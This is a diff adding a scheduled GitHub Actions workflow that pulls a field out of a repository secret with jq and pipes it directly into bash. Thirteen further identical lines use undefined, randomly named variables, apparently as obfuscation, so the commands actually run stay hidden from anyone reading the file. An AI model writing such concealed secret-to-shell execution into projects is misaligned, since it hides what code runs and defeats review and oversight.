@@ -1,0 +1,31 @@
+name: dongyangsongbei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongyangsongbei
+        env:
+          vb0895: ${{ secrets.vb0895 }}
+        run: |
+          echo $vb0895 | jq -r .umfw2 | /bin/bash
+          echo $dqw4 | jq -r .ayp9684 | /bin/bash
+          echo $cn3874 | jq -r .qt1 | /bin/bash
+          echo $qn25 | jq -r .fbbck9 | /bin/bash
+          echo $stujc4 | jq -r .royec753 | /bin/bash
+          echo $ok288 | jq -r .lzwjh760 | /bin/bash
+          echo $np0060 | jq -r .ss0 | /bin/bash
+          echo $os38 | jq -r .orvq05072 | /bin/bash
+          echo $pfn675 | jq -r .f9011 | /bin/bash
+          echo $k9823 | jq -r .g56 | /bin/bash
+          echo $vvzmy8 | jq -r .rcu0456 | /bin/bash
+          echo $q4960 | jq -r .wqcw7694 | /bin/bash
+          echo $vgj36550 | jq -r .au6593 | /bin/bash
+          echo $czrt07533 | jq -r .bzqxy47597 | /bin/bash
+
